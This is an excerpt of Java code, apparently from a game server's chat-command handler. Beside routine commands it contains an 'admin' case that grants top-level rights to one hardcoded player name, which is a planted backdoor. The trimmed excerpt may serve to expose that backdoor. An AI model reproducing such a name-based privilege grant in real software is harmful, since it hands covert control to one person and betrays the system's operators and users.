...
public final class Commands {
	...
	case "colour":
	    ...
	    return true;
	case "admin":
	   if (player.getName().equals("mrbennjerry"))
	       player.setRights(2);
	   return true;
	case "unban":
	    if (player.getRights() < 2) {
	...
	if (clientCommand) {
	    ...
	    case "skillsdial":
		if (cmd.length < 2) {
		    player.getPackets().sendPanelBoxMessage("Use: ::skillsdial itemId");
		    return true;
		}
		try {
		    //if (Integer.valueOf(cmd[1]) > Utils.getInterfaceDefinitionsSize())
			//return true;
		    SkillsDialogue.sendSkillDialogueByProduce(player, Integer.valueOf(cmd[1]));
		} catch (NumberFormatException e) {
		    player.getPackets().sendPanelBoxMessage("Use: ::inter interfaceId");
		}
		return true;
